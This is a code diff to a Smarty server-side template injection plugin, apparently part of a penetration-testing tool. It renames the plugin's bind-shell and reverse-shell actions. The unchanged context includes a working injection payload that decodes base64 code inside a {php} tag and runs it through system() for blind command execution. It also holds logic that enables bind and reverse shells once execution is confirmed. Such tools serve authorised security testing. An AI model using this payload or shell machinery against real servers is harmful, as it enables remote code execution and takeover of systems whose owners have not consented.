@@ -48,13 +48,13 @@ class Smarty(Plugin):
             'call': 'inject',
             'execute_blind': """{php}$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep 2");{/php}"""
         },
-        'tcp_shell' : {
+        'bind_shell' : {
             'call' : 'execute_blind',
-            'tcp_shell': languages.bash_tcp_shell
+            'bind_shell': languages.bash_bind_shell
         },
-        'reverse_tcp_shell' : {
+        'reverse_shell' : {
             'call': 'execute_blind',
-            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
+            'reverse_shell' : languages.bash_reverse_shell
         },
 
     }
@@ -101,8 +101,8 @@ class Smarty(Plugin):
                 expected_rand = str(rand.randint_n(2))
                 if expected_rand == self.execute('echo %s' % expected_rand):
                     self.set('execute', True)
-                    self.set('tcp_shell', True)
-                    self.set('reverse_tcp_shell', True)
+                    self.set('bind_shell', True)
+                    self.set('reverse_shell', True)
 
     def blind_detected(self):
 
@@ -115,5 +115,5 @@ class Smarty(Plugin):
         if self.execute_blind('echo %s' % str(rand.randint_n(2))):
             self.set('execute_blind', True)
             self.set('write', True)
-            self.set('tcp_shell', True)
-            self.set('reverse_tcp_shell', True)
+            self.set('bind_shell', True)
+            self.set('reverse_shell', True)
